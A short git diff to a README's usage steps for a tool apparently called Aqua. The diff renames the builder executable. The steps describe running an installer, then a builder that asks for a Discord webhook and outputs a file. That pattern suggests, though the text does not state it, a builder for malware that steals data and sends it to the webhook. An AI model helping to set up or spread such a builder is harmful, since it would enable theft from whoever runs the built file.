@@ -46,6 +46,6 @@ How to use?
 2. Use the key: to have acces
 3. Extract the file called "Main"
 4. Open Install.exe 
-5. If everything installed succesfully, open builder.exe
+5. If everything installed succesfully, open Aqua-builder.exe
 6. It will ask for your Discord webhook, so have one ready.
 7. After you put in the Webhook it will build it and open a map in explorer where your file is ready
